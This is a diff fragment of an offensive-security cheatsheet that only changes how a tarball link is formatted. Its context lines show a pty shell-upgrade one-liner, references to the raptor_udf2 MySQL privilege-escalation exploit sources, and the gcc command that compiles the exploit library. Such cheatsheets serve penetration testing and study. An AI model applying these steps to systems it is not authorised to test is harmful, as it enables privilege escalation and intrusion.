@@ -283,7 +283,7 @@ python -c 'import pty; pty.spawn("/bin/sh")'
 ```
 ##### MySQL User Defined Fuction Privilge Escalation
 Requires [raptor_udf2.c](https://github.com/mantvydasb/Offensive-Security-Cheatsheets/blob/master/raptor_udf2.c) and [sid-shell.c](https://github.com/mantvydasb/Offensive-Security-Cheatsheets/blob/master/sid-shell.c).
-Full tarball (https://github.com/mantvydasb/Offensive-Security-Cheatsheets/blob/master/raptor/raptor.tar)
+[Full tarball](https://github.com/mantvydasb/Offensive-Security-Cheatsheets/blob/master/raptor/raptor.tar)
 
 ```
 gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
